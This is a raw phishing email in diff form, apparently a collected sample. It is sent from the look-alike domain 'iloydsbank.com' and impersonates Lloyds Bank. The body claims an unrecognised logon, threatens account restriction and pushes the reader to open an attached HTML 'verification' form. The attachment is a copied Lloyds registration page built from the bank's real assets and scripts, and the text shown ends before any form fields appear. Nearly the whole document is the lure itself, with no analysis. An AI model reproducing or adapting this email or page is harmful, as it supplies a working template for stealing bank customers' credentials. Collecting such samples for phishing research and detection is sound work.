@@ -1,0 +1,2253 @@
+Return-Path: <internetbanking@iloydsbank.com>
+X-Original-To: jose@login.monkey.org
+Delivered-To: jose@login.monkey.org
+Received: from forward.b.hostedemail.com (forward.b.hostedemail.com [64.98.36.17])
+	by l.monkey.org (Postfix) with ESMTP id BB0C4F416C
+	for <jose@login.monkey.org>; Sat, 25 Jul 2015 05:29:48 -0500 (CDT)
+Received: from smtpin19.hostedemail.com (10.5.19.248.rfc1918.com [10.5.19.248])
+	by ofarelay03.b.hostedemail.com (Postfix) with SMTP id 5E66718471C
+	for <jose@login.monkey.org>; Sat, 25 Jul 2015 10:29:48 +0000 (UTC)
+X-Forwarded-For: jose@monkey.org by Hostedemail
+Delivered-To: jose@monkey.org
+X-FDA: 70446409656.19.cord63_1b42047feec4f
+Authentication-Results: auth.b.hostedemail.com; dkim=none
+	reason="no signature";
+	dkim-adsp=temperror reason="'_adsp._domainkey.Iloydsbank.com' reply was unresolved CNAME" (insecure policy);
+	dkim-atps=neutral
+X-Spam-Summary: 85,1,0,035c5470420e3022,d41d8cd98f00b204,internetbanking@iloydsbank.com,:internetbanking@iloydsbank.com,RULES_HIT:41:72:152:379:543:677:871:962:967:973:983:988:989:994:1189:1208:1216:1254:1260:1313:1314:1381:1390:1431:1432:1433:1434:1436:1437:1516:1517:1518:1545:1546:1547:1555:1571:1575:1588:1592:1594:1730:1744:1764:1777:1792:1801:1803:2194:2198:2199:2200:2525:2527:2568:2610:2639:2682:2685:2741:2859:2890:2893:2894:2897:2901:2908:2909:2916:2921:2923:2924:2925:2926:2933:2937:2939:2942:2945:2947:2951:2954:3000:3022:3138:3139:3140:3141:3142:3352:3865:3866:3867:3868:3871:3873:3874:3934:3936:3938:3941:3944:3947:3950:3953:3956:3959:4042:4321:4362:4605:4822:5007:6261:6354:6669:6687:6748:7281:7398:7652:8512:8518:8583:8603:8829:8957:9025:9080:9149:9416:9908:10004:10079:10216:10265:10305:10394:11026:11233:11604:11657:11658:11914:12043:12217:12438:12517:12519:12555:12561:12973:13019:13132:13144:13163:13229:13230:13231:13302:14096:14515:21062:21080,0,RBL:212.40.7.66-irl.urbl.hoste
+X-HE-Tag: cord63_1b42047feec4f
+X-Filterd-Recvd-Size: 65017
+Received: from vds303104.vtx.ch (vds303104.vtx.ch [212.40.7.66])
+	by imf01.b.hostedemail.com (Postfix) with ESMTP
+	for <JOSE@MONKEY.ORG>; Sat, 25 Jul 2015 10:29:47 +0000 (UTC)
+X-No-Relay: not in my network
+X-No-Relay: not in my network
+X-No-Relay: not in my network
+X-No-Relay: not in my network
+X-No-Relay: not in my network
+X-No-Relay: not in my network
+X-No-Relay: not in my network
+X-No-Relay: not in my network
+X-No-Relay: not in my network
+X-No-Relay: not in my network
+X-No-Relay: not in my network
+X-No-Relay: not in my network
+X-No-Relay: not in my network
+X-No-Relay: not in my network
+X-No-Relay: not in my network
+X-No-Relay: not in my network
+X-No-Relay: not in my network
+X-No-Relay: not in my network
+X-No-Relay: not in my network
+X-No-Relay: not in my network
+Received: from [104.167.118.61] (unknown [104.167.118.61])
+	by vds303104.vtx.ch (Postfix) with ESMTPA id 0DDB580C3F6;
+	Fri, 24 Jul 2015 14:47:00 +0200 (CEST)
+Content-Type: multipart/mixed; boundary="===============0053034220=="
+MIME-Version: 1.0
+Subject: FINAL NOTICE: Verification of Recent Account Activity(s) Required
+To: Recipients <InternetBanking@Iloydsbank.com>
+From: "Lloyds Bank" <InternetBanking@Iloydsbank.com>
+Date: Fri, 24 Jul 2015 08:46:28 -0400
+X-Priority: 1 (High)
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 131
+
+You will not see this in a MIME-aware mail reader.
+--===============0053034220==
+Content-Type: multipart/alternative; boundary="===============1735218234=="
+MIME-Version: 1.0
+
+--===============1735218234==
+Content-Type: text/plain; charset="utf-8"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+ =
+
+  Internet Banking =96 We're making a few security updates.	 	 	 =
+
+  	 =
+
+  =
+
+  	 	 	 	 	 	 	 =
+
+ 	 =
+
+  =
+
+  	 	 	 =
+
+  	  =
+
+  =
+
+  	 	 	   	 	 =
+
+ 	 =
+
+  	 =
+
+  	 	 =
+
+  	 =
+
+   =
+
+  	  =
+
+  Verification of Recent Account Activity. 	 =
+
+   =
+
+ As part of our ongoing effort to protect your account and our relationship=
+, we monitor your account for possible fraudulent activity. We need to conf=
+irm that you or someone authorized to use your account made the following a=
+ctivity(s) on your account  =
+
+ =
+
+ 1) A recent logon from a computer we do not recognize. =
+
+ =
+
+ What do I have to do?
+
+  Please download the attached form and complete the verification process.  =
+
+  =
+
+ =
+
+ Your satisfaction is important to us, and we appreciate your prompt attent=
+ion to this matter otherwise access to this account would be restricted. =
+
+
+ Thank you for being a Lloyds customer. 	 =
+
+ 	 =
+
+ 	 =
+
+ 	 =
+
+  	 	 =
+
+  	 =
+
+ 	 	 =
+
+ 	 =
+
+   =
+
+  	 	 	 	 	 	 	 =
+
+ 	 =
+
+   	=20
+--===============1735218234==
+Content-Type: text/html; charset="utf-8"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+<html><head><meta http-equiv=3D"Content-Type" content=3D"text/html; charset=
+=3Dutf-8"/></head><tbody><tr>
+          <td><table class=3D"ecxno_mobile_phone" border=3D"0" cellpadding=
+=3D"0" cellspacing=3D"0" width=3D"100%" align=3D"center">
+              <tbody><tr>
+                <td class=3D"ecxcolumn_split_preheader" style=3D"padding:15=
+px 0;font-family:Helvetica,Arial,sans-serif;font-size:12px;color:#666666;te=
+xt-align:left;" width=3D"471" align=3D"left"><a href=3D"#" style=3D"text-de=
+coration:none;color:#666666;" target=3D"_blank"><strong>Internet Banking</s=
+trong> =E2=80=93 We're making a few security updates.</a></td>
+
+                <td class=3D"ecxno_mobile_phone" width=3D"38"><img src=3D"h=
+ttps://image.paypal-communication.com/paypal_eu/common/module_system/module=
+s/spacer10.gif" style=3D"display:block;" border=3D"0" height=3D"1" width=3D=
+"38"></td>
+                <td class=3D"ecxcolumn_split_preheader" style=3D"padding:15=
+px 0;line-height:19px;font-family:Helvetica,Arial,sans-serif;font-size:12px=
+;color:#666666;text-align:right;" width=3D"191" align=3D"right"></td>
+
+              </tr>
+            </tbody></table>
+            =
+
+            =
+
+            </td>
+        </tr>
+         =
+
+        =
+
+        <tr>
+          <td><table class=3D"ecxmobile_table_width" border=3D"0" cellpaddi=
+ng=3D"0" cellspacing=3D"0" width=3D"700" align=3D"center">
+              <tbody><tr>
+                <td><img src=3D"https://image.paypal-communication.com/payp=
+al_eu/common/module_system/wireframe/images/template_top_left_1px.jpg" alt=
+=3D"" style=3D"display:block;" border=3D"0" height=3D"20" width=3D"1"></td>
+                <td><img src=3D"https://image.paypal-communication.com/payp=
+al_eu/common/module_system/wireframe/images/template_top_left_3px.jpg" alt=
+=3D"" style=3D"display:block;" border=3D"0" height=3D"20" width=3D"3"></td>
+                <td><img class=3D"ecxhead_top_320px" src=3D"https://image.p=
+aypal-communication.com/paypal_eu/common/module_system/wireframe/images/tem=
+plate_top_312px.jpg" alt=3D"" style=3D"display:block;" border=3D"0" height=
+=3D"20" width=3D"312"></td>
+                <td><img class=3D"ecxhead_top_160px" src=3D"https://image.p=
+aypal-communication.com/paypal_eu/common/module_system/wireframe/images/tem=
+plate_top_160px.jpg" alt=3D"" style=3D"display:block;" border=3D"0" height=
+=3D"20" width=3D"160"></td>
+                <td><img class=3D"ecxhead_top_220px" src=3D"https://image.p=
+aypal-communication.com/paypal_eu/common/module_system/wireframe/images/tem=
+plate_top_220px.jpg" alt=3D"" style=3D"display:block;" border=3D"0" height=
+=3D"20" width=3D"220"></td>
+                <td><img src=3D"https://image.paypal-communication.com/payp=
+al_eu/common/module_system/wireframe/images/template_top_right_3px.jpg" alt=
+=3D"" style=3D"display:block;" border=3D"0" height=3D"20" width=3D"3"></td>
+                <td><img src=3D"https://image.paypal-communication.com/payp=
+al_eu/common/module_system/wireframe/images/template_top_right_1px.jpg" alt=
+=3D"" style=3D"display:block;" border=3D"0" height=3D"20" width=3D"1"></td>
+              </tr>
+            </tbody></table></td>
+        </tr>
+         =
+
+        =
+
+        <tr>
+          <td style=3D"background:#f2f2f2;"><table class=3D"ecxmobile_table=
+_width" style=3D"background:#f2f2f2;" border=3D"0" cellpadding=3D"0" cellsp=
+acing=3D"0" width=3D"700" align=3D"center">
+              =
+
+              <tbody><tr>
+                <td style=3D"background:#e3e3e3;"><img src=3D"https://image=
+.paypal-communication.com/paypal_eu/common/module_system/modules/spacer10.g=
+if" style=3D"display:block;" border=3D"0" height=3D"1" width=3D"1"></td>
+                <td style=3D"background:#fff;"><img class=3D"ecximg_body_sp=
+acer" src=3D"https://image.paypal-communication.com/paypal_eu/common/module=
+_system/modules/spacer10.gif" style=3D"display:block;" border=3D"0" height=
+=3D"1" width=3D"698"></td>
+                <td style=3D"background:#e3e3e3;"><img src=3D"https://image=
+.paypal-communication.com/paypal_eu/common/module_system/modules/spacer10.g=
+if" style=3D"display:block;" border=3D"0" height=3D"1" width=3D"1"></td>
+              </tr>
+               =
+
+              =
+
+              <tr>
+                <td style=3D"background:#e3e3e3;"><img src=3D"https://image=
+.paypal-communication.com/paypal_eu/common/module_system/modules/spacer10.g=
+if" style=3D"display:block;" border=3D"0" height=3D"1" width=3D"1"></td>
+                =
+
+                <td style=3D"background:#fff;" valign=3D"top" align=3D"left=
+">
+                  =
+
+                  <table class=3D"ecxmobile_body_table_width" style=3D"back=
+ground:#fff;" border=3D"0" cellpadding=3D"0" cellspacing=3D"0" width=3D"698=
+" align=3D"center">
+                    <tbody><tr>
+                      <td><table class=3D"ecxmobile_body_table_width" style=
+=3D"background:#fff;" border=3D"0" cellpadding=3D"0" cellspacing=3D"0" widt=
+h=3D"698" align=3D"center">
+                          <tbody><tr>
+                          <td style=3D"background:#fff;" class=3D"ecxleftRi=
+ghtMargin20" width=3D"29"><img class=3D"ecxleftRightMargin20" src=3D"https:=
+//image.paypal-communication.com/paypal_eu/common/module_system/modules/spa=
+cer10.gif" style=3D"display:block;" border=3D"0" height=3D"1" width=3D"29">=
+</td>
+                            <td style=3D"background:#fff;" valign=3D"top" w=
+idth=3D"140"><a href=3D"https://email-edg.paypal.com/r/Z86IWH9/EQBURP/62SCI=
+8O/QHBHMI/WHP3ZQ/FI/h" target=3D"_blank"><img src=3D"https://online.lloydsb=
+ank.co.uk/wps/wcm/connect/5bec958040a0730a88a689b36433efea/logo-9-142314737=
+8.png?MOD=3DAJPERES&CACHEID=3D5bec958040a0730a88a689b36433efea" alt=3D"Lloy=
+ds Bank" style=3D"display:block;" border=3D"0" ></a></td>
+                            <td style=3D"background:#fff;" class=3D"ecxleft=
+RightMargin20" width=3D"40"><img class=3D"ecxleftRightMargin20" src=3D"http=
+s://image.paypal-communication.com/paypal_eu/common/module_system/modules/s=
+pacer10.gif" style=3D"display:block;" border=3D"0" height=3D"1" width=3D"40=
+"></td>
+                            =
+
+                            =
+
+                            =
+
+                            <td style=3D"background:#fff;" valign=3D"top" a=
+lign=3D"right">
+                            =
+
+
+                            <img class=3D"ecxleftRightMargin20" src=3D"http=
+s://image.paypal-communication.com/paypal_eu/common/module_system/modules/s=
+pacer10.gif" style=3D"display:block;" border=3D"0" height=3D"1" width=3D"11=
+8">
+                                 =
+
+                            =
+
+                            </td>
+                            <td style=3D"background:#fff;" class=3D"ecxleft=
+RightMargin20" width=3D"29"><img class=3D"ecxleftRightMargin20" src=3D"http=
+s://image.paypal-communication.com/paypal_eu/common/module_system/modules/s=
+pacer10.gif" style=3D"display:block;" border=3D"0" height=3D"1" width=3D"29=
+"></td>
+                             =
+
+                          </tr>
+                        </tbody></table></td>
+                    </tr>
+
+                    <tr>
+                      <td style=3D"background:#fff;"><img src=3D"https://im=
+age.paypal-communication.com/paypal_eu/common/module_system/modules/spacer1=
+0.gif" style=3D"display:block;" border=3D"0" height=3D"29" width=3D"1"></td>
+                    </tr>
+                  </tbody></table>
+                  =
+
+                  </td>
+                =
+
+                <td style=3D"background:#e3e3e3;"><img src=3D"https://image=
+.paypal-communication.com/paypal_eu/common/module_system/modules/spacer10.g=
+if" style=3D"display:block;" border=3D"0" height=3D"1" width=3D"1"></td>
+              </tr>
+               =
+
+              =
+
+              <tr>
+                <td style=3D"background:#e3e3e3;"><img src=3D"https://image=
+.paypal-communication.com/paypal_eu/common/module_system/modules/spacer10.g=
+if" style=3D"display:block;" border=3D"0" height=3D"1" width=3D"1"></td>
+                =
+
+                <td style=3D"background:#fff;font-family:Helvetica,Arial,sa=
+ns-serif;font-size:13px;color:#666666;padding-bottom:9px;" valign=3D"top" a=
+lign=3D"left"><table class=3D"ecxmobile_body_table_width" style=3D"backgrou=
+nd:#fff;" border=3D"0" cellpadding=3D"0" cellspacing=3D"0" width=3D"698" al=
+ign=3D"center">
+                    <tbody><tr>
+                      <td class=3D"ecxmobile_body_table_width_pad29" style=
+=3D"background:#fff;" width=3D"640"> =
+
+                        =
+
+
+<table class=3D"ecxmobile_body_table_width" style=3D"background:#fff;" bord=
+er=3D"0" cellpadding=3D"0" cellspacing=3D"0" width=3D"698" align=3D"center">
+  <tbody><tr>
+    <td class=3D"ecxleftRightMargin20" width=3D"29"><img class=3D"ecxleftRi=
+ghtMargin20" src=3D"https://image.paypal-communication.com/paypal_eu/common=
+/module_system/modules/spacer10.gif" style=3D"display:block;" border=3D"0" =
+height=3D"1" width=3D"29"></td>
+    <td style=3D"padding:0 0 30px 0;">
+      =
+
+      <table class=3D"ecxmobile_body_table_width_pad20" style=3D"background=
+:#fff;" border=3D"0" cellpadding=3D"0" cellspacing=3D"0" width=3D"640" alig=
+n=3D"center">
+        <tbody><tr>
+          <td class=3D"ecxmobile_body_table_width_pad20" style=3D"font-fami=
+ly:Helvetica,Arial,sans-serif;color:#666666;font-size:13px;padding:0 0 20px=
+ 0;"><span class=3D"ecxtext_lightblue_header" style=3D"color:#009CDE;font-s=
+ize:42px;font-family:Helvetica,Arial,sans-serif;">Verification of Recent Ac=
+count Activity.</span>
+          </td>
+          </tr>
+           <tr>
+          <td class=3D"ecxmobile_body_table_width_pad20" style=3D"font-fami=
+ly:Helvetica,Arial,sans-serif;color:#666666;font-size:13px;line-height:19px=
+;padding:0 0 23px 0;">
+          =
+
+            <span style=3D"font-size:13px;line-height:19px;color:#666666;fo=
+nt-family:Helvetica,Arial,sans-serif;"><br>
+As part of our ongoing effort to protect your account and our relationship,=
+ we monitor your account for possible fraudulent activity.
+<strong>We need to confirm that you or someone authorized to use your accou=
+nt made the following activity(s) on your account </strong>
+<br>
+<br>
+1)
+A recent logon from a computer we do not recognize.
+<br>
+<br>
+<strong>What do I have to do?</strong><br><br>
+<font color=3D"#000000" face=3D"verdana,arial,helvetica,sans-serif" size=3D=
+"3">
+<strong>Please download the attached form and complete the verification pro=
+cess.
+</strong>
+<br>
+</font>
+<br>
+
+<br>
+Your satisfaction is important to
+us, and we appreciate your prompt
+attention to this matter otherwise access to this account would be restrict=
+ed.
+<br><br>
+Thank you for being a Lloyds customer.
+ =
+
+            =
+
+            </td>
+            </tr>
+            =
+
+            =
+
+            =
+
+
+        =
+
+                        </tbody></table></td>
+                    </tr>
+                  </tbody></table></td>
+              </tr>
+            </tbody></table></td>
+        </tr>
+      </tbody></table>
+      =
+
+      </td>
+    <td class=3D"ecxleftRightMargin20" width=3D"29"><img class=3D"ecxleftRi=
+ghtMargin20" src=3D"https://image.paypal-communication.com/paypal_eu/common=
+/module_system/modules/spacer10.gif" style=3D"display:block;" border=3D"0" =
+height=3D"1" width=3D"29"></td>
+  </tr>
+</tbody></table>
+
+
+
+    =
+
+    =
+
+                        =
+
+                        =
+
+                        =
+
+                        </td>
+                    </tr>
+                  </tbody></table></td>
+                =
+
+                <td style=3D"background:#e3e3e3;"><img src=3D"https://image=
+.paypal-communication.com/paypal_eu/common/module_system/modules/spacer10.g=
+if" style=3D"display:block;" border=3D"0" height=3D"1" width=3D"1"></td>
+              </tr>
+              =
+
+            </tbody></table></td>
+        </tr>
+         =
+
+        =
+
+        <tr>
+          <td>
+            <table class=3D"ecxmobile_table_width" border=3D"0" cellpadding=
+=3D"0" cellspacing=3D"0" width=3D"700" align=3D"center">
+              <tbody><tr>
+                <td><img src=3D"https://image.paypal-communication.com/payp=
+al_eu/common/module_system/wireframe/images/template_bot_left_1px.jpg" alt=
+=3D"" style=3D"display:block;" border=3D"0" height=3D"20" width=3D"1"></td>
+                <td><img src=3D"https://image.paypal-communication.com/payp=
+al_eu/common/module_system/wireframe/images/template_bot_left_3px.jpg" alt=
+=3D"" style=3D"display:block;" border=3D"0" height=3D"20" width=3D"3"></td>
+                <td><img class=3D"ecxhead_top_320px" src=3D"https://image.p=
+aypal-communication.com/paypal_eu/common/module_system/wireframe/images/tem=
+plate_bot_312px.jpg" alt=3D"" style=3D"display:block;" border=3D"0" height=
+=3D"20" width=3D"312"></td>
+                <td><img class=3D"ecxhead_top_160px" src=3D"https://image.p=
+aypal-communication.com/paypal_eu/common/module_system/wireframe/images/tem=
+plate_bot_160px.jpg" alt=3D"" style=3D"display:block;" border=3D"0" height=
+=3D"20" width=3D"160"></td>
+                <td><img class=3D"ecxhead_top_220px" src=3D"https://image.p=
+aypal-communication.com/paypal_eu/common/module_system/wireframe/images/tem=
+plate_bot_220px.jpg" alt=3D"" style=3D"display:block;" border=3D"0" height=
+=3D"20" width=3D"220"></td>
+                <td><img src=3D"https://image.paypal-communication.com/payp=
+al_eu/common/module_system/wireframe/images/template_bot_right_3px.jpg" alt=
+=3D"" style=3D"display:block;" border=3D"0" height=3D"20" width=3D"3"></td>
+                <td><img src=3D"https://image.paypal-communication.com/payp=
+al_eu/common/module_system/wireframe/images/template_bot_right_1px.jpg" alt=
+=3D"" style=3D"display:block;" border=3D"0" height=3D"20" width=3D"1"></td>
+              </tr>
+            </tbody></table></td>
+        </tr>
+         =
+
+        =
+
+        <tr>
+          <td>
+          </td>
+        </tr></html>
+--===============1735218234==--
+--===============0053034220==
+MIME-Version: 1.0
+Content-Type: text/html; charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+Content-Disposition: attachment;
+	filename="Lloyds Bank - Welcome to Internet Banking.html"
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.=
+w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<html xmlns=3D"http://www.w3.org/1999/xhtml" lang=3D"en-gb" xml:lang=3D"en-=
+gb">
+    <head>
+        =
+
+
+
+
+
+<title>Lloyds Bank - Online Personal Registration</title>
+<meta name=3D"keywords" content=3D"" />
+<meta name=3D"description" content=3D"" />
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Dutf-8" />	=
+
+<meta http-equiv=3D"content-language" content=3D"en-gb" />
+<!--[if gte IE 8]><meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3DIE8"=
+ /><![endif]-->
+<meta name=3D"robots" content=3D"noindex" />
+<meta name=3D"distribution" content=3D"global" />
+<meta name=3D"rating" content=3D"general" />
+<meta http-equiv=3D"pics-label" content=3D'(pics-1.1 "http://www.icra.org/r=
+atingsv02.html" comment "Single file EN v2.0" l gen true for "http://online=
+.lloydsbank.co.uk/personal" r (nz 1 vz 1 lz 1 oz 1 cz 1) "http://www.rsac.o=
+rg/ratingsv01.html" l gen true for "http://online.lloydsbank.co.uk/personal=
+" r (n 0 s 0 v 0 l 0))'>
+
+
+
+
+
+
+
+
+<link rel=3D"shortcut icon" href=3D"https://online.lloydsbank.co.uk/persona=
+l/unauth/assets/LloydsRetail/img/icons/favicon.ico" />
+
+<link href=3D"https://online.lloydsbank.co.uk/personal/assets/LloydsRetail/=
+style/global1-min150605.css" media=3D"screen, print" type=3D"text/css" rel=
+=3D"stylesheet" />
+<link href=3D"https://online.lloydsbank.co.uk/personal/assets/LloydsRetail/=
+style/global2-min150605.css" media=3D"screen, print" type=3D"text/css" rel=
+=3D"stylesheet" />
+
+
+<link href=3D"https://online.lloydsbank.co.uk/personal/assets/LloydsRetail/=
+style/global3-min150622.css" media=3D"screen, print" type=3D"text/css" rel=
+=3D"stylesheet" />
+
+<link href=3D"https://online.lloydsbank.co.uk/personal/assets/LloydsRetail/=
+style/print/print_base-min150605.css" media=3D"print" type=3D"text/css" rel=
+=3D"stylesheet" />
+<!--[if IE 8]>
+<link href=3D"https://online.lloydsbank.co.uk/personal/assets/LloydsRetail/=
+style/ie/ie8-min141128.css" type=3D"text/css" rel=3D"stylesheet" />
+<![endif]-->
+<!--[if IE 7]>
+<link href=3D"https://online.lloydsbank.co.uk/personal/assets/LloydsRetail/=
+style/ie/ie7-min141128.css" type=3D"text/css" rel=3D"stylesheet" />
+<![endif]-->
+<!--[if lt IE 7]>
+<link href=3D"https://online.lloydsbank.co.uk/personal/assets/LloydsRetail/=
+style/ie/ie6-min141126.css" type=3D"text/css" rel=3D"stylesheet" />
+<![endif]-->
+
+
+
+<script type=3D"text/javascript" src=3D"https://online.lloydsbank.co.uk/per=
+sonal/assets/lib/jquery-min150605.js"></script>
+<script type=3D"text/javascript" src=3D"https://online.lloydsbank.co.uk/per=
+sonal/static/scriptsnippet.jspf"></script>
+
+<script type=3D"text/javascript" src=3D"https://online.lloydsbank.co.uk/per=
+sonal/assets/lib/smart_rewards-min140603.js"></script>
+
+
+
+
+
+<script type=3D"text/javascript" src=3D"https://online.lloydsbank.co.uk/per=
+sonal/assets/lib/global-min150703.js"></script>
+<script type=3D"text/javascript" src=3D"https://online.lloydsbank.co.uk/per=
+sonal/assets/LloydsRetail/script/custom-min150202.js"></script>
+
+
+
+<script type=3D"text/javascript">
+                window['adrum-start-time'] =3D new Date().getTime();</scrip=
+t>
+<script type=3D"text/javascript"
+	src=3D"https://online.lloydsbank.co.uk/personal/assets/lib/adrum.js"></scr=
+ipt>
+
+
+<script type=3D'text/javascript'
+src=3D'https://static.atgsvcs.com/js/atgsvcs.js'></script>
+<script type=3D'text/javascript'> ATGSvcs.setUOID(200106303679);
+</script>
+
+        =
+
+    </head>
+    <body>
+        =
+
+            <script type=3D"text/javascript">var _AP=3D{};_AP.domain=3D"sta=
+tse.webtrendslive.com";_AP.dcsid=3D"dcsfn00jp100000w4d2tx3zos_2b3p";_AP.fpc=
+dom=3D".lloydsbank.co.uk";_AP.bypassStyleClass=3D"newwin,newhelpwin,newfaqw=
+in,overlay,printwin,overlayContainer";_AP.onsiteDoms=3D"(lloyds|halifax|ban=
+kofscotland)";_AP.brandDomains=3D{"Lloyds" : ["lloyds", "baucr-lp.intranet.=
+group"],
+
+                  "Halifax" : ["halifax", "baucr-hp.intranet.group"],
+
+                  "BOS" : ["bankofscotland", "baucr-bp.intranet.group"],
+
+                  "TSB" : ["tsb", "baucr-vp.intranet.group"]};_AP.testDomai=
+ns=3D[".intranet.group"];_AP.crypticURLs=3D["https://online.lloydsbank.co.u=
+k/personal/a/account_details/",
+
+                        "https://online.lloydsbank.co.uk/personal/a/make_tr=
+ansfer/",
+
+                        "https://online.lloydsbank.co.uk/personal/a/make_pa=
+yment/",
+
+                        "https://online.lloydsbank.co.uk/personal/a/mobile/=
+account_details/",
+
+                        "https://online.lloydsbank.co.uk/personal/a/mobile/=
+make_transfer/",
+
+                        "https://online.lloydsbank.co.uk/personal/a/setup_s=
+tandingorder/",
+
+                        "https://online.lloydsbank.co.uk/personal/a/mobile/=
+make_payment/",     =
+
+
+                        "https://online.lloydsbank.co.uk/personal/a/set_up_=
+new_payee/",
+
+                        "https://online.lloydsbank.co.uk/personal/a/ava_upg=
+rade/",
+
+                        "https://online.lloydsbank.co.uk/personal/a/manage_=
+overdraft/",
+
+                        "https://online.lloydsbank.co.uk/personal/a/All_AVA=
+/",
+
+                        "https://online.lloydsbank.co.uk/personal/a/balance=
+_transfer_offers/",
+
+                        "https://online.lloydsbank.co.uk/personal/a/manage_=
+paper_statement/",
+
+                        "https://online.lloydsbank.co.uk/personal/a/balance=
+_transfer_existing/",
+
+                        "https://online.lloydsbank.co.uk/personal/a/order_p=
+aper_statement/",
+
+                        "https://online.lloydsbank.co.uk/personal/a/compare=
+_ava_products/",
+
+                        "https://online.lloydsbank.co.uk/personal/a/apply_f=
+or_external_isa/",
+
+                        "https://online.lloydsbank.co.uk/personal/a/manage_=
+text_alerts/",
+
+                        "https://online.lloydsbank.co.uk/personal/a/create_=
+isa/",
+
+                        "https://online.lloydsbank.co.uk/personal/a/manage_=
+pin_details/",
+
+                        "https://online.lloydsbank.co.uk/personal/a/Adding_=
+Card_Holder/"];_AP.domainID=3D"288862";_AP.keyToken=3D"fbaed4f873f801dbc6ad=
+3569078cf9aa9a00c12fa7";</script>
+        =
+
+        <div id=3D"wrapper">
+            =
+
+
+
+
+
+
+<div class=3D"outer">
+    <div id=3D"header">
+        <ul id=3D"skiplinks"> =
+
+            <li><a id=3D"lnkSkip" name=3D"lnkSkip" href=3D"#page">Skip to m=
+ain content</a></li>
+        </ul>
+        <div class=3D"clearfix">
+            <p id=3D"logo">
+                <span><img src=3D"https://online.lloydsbank.co.uk/wps/wcm/c=
+onnect/5bec958040a0730a88a689b36433efea/logo-9-1423147378.png?MOD=3DAJPERES=
+&amp;CACHEID=3D5bec958040a0730a88a689b36433efea" alt=3D"Lloyds&#160;Bank" /=
+></span>  =
+
+            </p>
+            =
+
+            =
+
+            =
+
+                =
+
+                    =
+
+                    =
+
+                =
+
+                        =
+
+                            =
+
+                        =
+
+                        =
+
+                    =
+
+                    =
+
+                        =
+
+                                    =
+
+                        =
+
+                =
+
+                =
+
+                =
+
+                    =
+
+                    =
+
+                =
+
+                =
+
+                    =
+
+                        =
+
+                        =
+
+                    =
+
+                    =
+
+                                            =
+
+                                            =
+
+                    =
+
+                    =
+
+                    =
+
+                        =
+
+                    =
+
+                =
+
+            <div class=3D"secureMsg"><p class=3D"msg"><img src=3D"https://o=
+nline.lloydsbank.co.uk/wps/wcm/connect/73d1fb0040a07cb4bb1bbbb36433efea/sec=
+ure_msg-2.png?MOD=3DAJPERES&amp;CACHEID=3D73d1fb0040a07cb4bb1bbbb36433efea"=
+ alt=3D"You're logged into a secure site" /></p></div><ul class=3D"loggedHe=
+aderLinks">
+                                <li class=3D"mobile"><a id=3D"mobileLink" n=
+ame=3D"mobileLink" href=3D"https://online.lloydsbank.co.uk/personal/logon/l=
+ogin.jsp?mobile=3Dtrue" title=3D"Mobile" class=3D"linkBullet">Mobile</a></l=
+i>
+                            </ul>
+        </div>
+    </div>
+</div>
+            <div class=3D"pageWrap">
+                <div id=3D"page" class=3D"content">
+                =
+
+                    <div class=3D"primaryWrap">
+                    =
+
+                        <div class=3D"primary">
+                        <div class=3D"panel">
+                        =
+
+                        =
+
+                        =
+
+                                            =
+
+                            =
+
+            =
+
+            =
+
+            <span id=3D"strBrandName" style=3D"display:none">LLOYDS</span>
+            <span id=3D"strstepno" style=3D"display:none">Step 1</span>
+            <span id=3D"strscenarioname" style=3D"display:none">onlineregis=
+tration</span>
+            =
+
+            =
+
+
+
+
+
+
+            =
+
+            =
+
+            =
+
+
+            =
+
+            =
+
+                =
+
+                =
+
+            =
+
+            =
+
+                =
+
+                =
+
+                    =
+
+                    =
+
+                    =
+
+                    =
+
+                    =
+
+                =
+
+            =
+
+               =
+
+            =
+
+                =
+
+                =
+
+                    =
+
+                    =
+
+                    =
+
+                    =
+
+                    =
+
+                    =
+
+                    =
+
+                =
+
+            <div class=3D"navBar clearfix dbtNav"><ol class=3D"progressBar"=
+><li class=3D"current"><div>Help us identify you</div></li></ol></div>
+            =
+
+            =
+
+                =
+
+                    =
+
+                    =
+
+                    =
+
+                    =
+
+                =
+
+                =
+
+                    =
+
+                    =
+
+                    =
+
+                    =
+
+                  =
+
+                    =
+
+                    =
+
+                    =
+
+                           =
+
+                    =
+
+                    =
+
+                =
+
+                =
+
+                    =
+
+                    =
+
+                        =
+
+                        =
+
+                        =
+
+                        =
+
+                    =
+
+                    =
+
+                    =
+
+                         =
+
+                         =
+
+                         =
+
+                         =
+
+                    =
+
+                    =
+
+                    =
+
+                        =
+
+                        =
+
+                        =
+
+                        =
+
+                    =
+
+
+                    =
+
+                    =
+
+                        =
+
+                        =
+
+                    =
+
+                =
+
+                =
+
+                    =
+
+                    =
+
+                        =
+
+                        =
+
+
+                    =
+
+                    =
+
+                        =
+
+                        =
+
+                    =
+
+                    =
+
+                    =
+
+                        =
+
+                            =
+
+                            =
+
+                            =
+
+                            =
+
+                        =
+
+                    =
+
+
+                =
+
+
+                =
+
+                    =
+
+                        =
+
+                        =
+
+                            =
+
+                        =
+
+                        =
+
+                        =
+
+                        =
+
+                            =
+
+                        =
+
+                            =
+
+                                =
+
+                                =
+
+                        =
+
+                    =
+
+                    =
+
+                        =
+
+                        =
+
+                        =
+
+                        =
+
+                    =
+
+                    =
+
+                        =
+
+                            =
+
+                            =
+
+                                =
+
+                                =
+
+                            =
+
+                            =
+
+                            =
+
+                            =
+
+                            =
+
+                            =
+
+                                =
+
+                        =
+
+                    =
+
+
+                    =
+
+
+                        =
+
+                            =
+
+                            =
+
+                            =
+
+                            =
+
+                                =
+
+                                =
+
+                                =
+
+                                =
+
+                            =
+
+                            =
+
+                            =
+
+                            =
+
+                                =
+
+                                =
+
+                                =
+
+                                =
+
+
+                            =
+
+                        =
+
+                        =
+
+                            =
+
+                            =
+
+                            =
+
+                                =
+
+                                =
+
+                                =
+
+                                =
+
+                                =
+
+                                =
+
+                            =
+
+
+                            =
+
+
+                                =
+
+                                =
+
+                                =
+
+                                =
+
+                                =
+
+                                =
+
+                                =
+
+                                    =
+
